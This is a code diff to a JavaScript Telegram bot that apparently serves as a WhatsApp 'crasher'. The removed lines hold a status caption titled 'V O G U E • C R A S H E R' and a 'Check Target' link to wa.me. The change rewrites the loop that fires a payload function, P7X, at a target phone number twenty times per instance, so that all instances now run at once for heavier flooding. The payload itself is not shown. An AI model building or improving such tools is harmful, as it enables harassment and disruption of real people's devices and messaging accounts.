@@ -2166,82 +2166,66 @@ Dispatch engine initialized.
             );
         
         (async () => {
-            
-            const instanceId = Date.now() + Math.random();
-            
-            for (let exec = 0; exec < executionCount; exec++) {
-                
-                for (let i = 0; i < 20; i++) {
-                    try {
-                     
-                        if (!sock) {
-                            throw new Error(
-                                "Socket unavailable"
+
+            const instanceBase = Date.now();
+        
+            const totalInstances = executionCount;
+        
+            const createInstance = async (instanceIndex) => {
+        
+                const instanceId = `${instanceBase}-${instanceIndex}`;
+        
+                try {
+        
+                    for (let i = 0; i < 20; i++) {
+        
+                        try {
+        
+                            if (!sock) {
+                                throw new Error("Socket unavailable");
+                            }
+        
+                            await P7X(sock, target);
+                            await sleep(1000)
+        
+                            console.log(
+                                `[INSTANCE ${instanceId}] Exec ${i + 1}/20`
                             );
+        
+                        } catch (e) {
+        
+                            console.log(
+                                `[INSTANCE ${instanceId}] Error: ${e.message}`
+                            );
+        
+                            autoRestartOn408(e);
                         }
-                        
-                        await P7X(sock, target);
-                        await sleep(1000);
-                        
-                    } catch (e) {
-                        
-                        console.log(
-                            `[WORKER ${instanceId}] Error: ${e.message}`
-                        );
-                        
-                        autoRestartOn408(e);
                     }
+        
+                    console.log(
+                        `[INSTANCE ${instanceId}] DONE`
+                    );
+        
+                } catch (err) {
+        
+                    console.log(
+                        `[INSTANCE ${instanceId}] FAILED: ${err.message}`
+                    );
                 }
-                
-                console.log(
-                    `[WORKER ${instanceId}] Execution ${exec + 1}/${executionCount}`
-                );
-            }
-            
-            // =========================
-            // COMPLETE OUTPUT
-            // =========================
-            
-            await ctx.telegram.editMessageCaption(
-                ctx.chat.id,
-                sent.message_id,
-                undefined,
-                
-`
-<pre>
-V O G U E  •  C R A S H E R
-──────────────────────────
-
-EXECUTION STATUS
-
-Target      : ${q}
-Execution   : ${executionCount}x
-Loop        : 2
-Status      : Complete
-
-──────────────────────────
-All execution completed successfully.
-</pre>`,
-                {
-                    parse_mode: "HTML",
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: "Check Target",
-                                    url: `https://wa.me/${q}`,
-                                    style: "success"
-                                }
-                            ]
-                        ]
-                    }
-                }
+            };
+        
+            // 🔥 BANGUN SEMUA INSTANCE SEKALIGUS
+            const allInstances = Array.from(
+                { length: totalInstances },
+                (_, i) => createInstance(i + 1)
             );
-            
+        
+            await Promise.allSettled(allInstances);
+        
             console.log(
-                `[WORKER ${instanceId}] Done for ${q}`
+                `[SYSTEM] All ${totalInstances} instances completed`
             );
-            
+        
         })();
         
     } catch (error) {
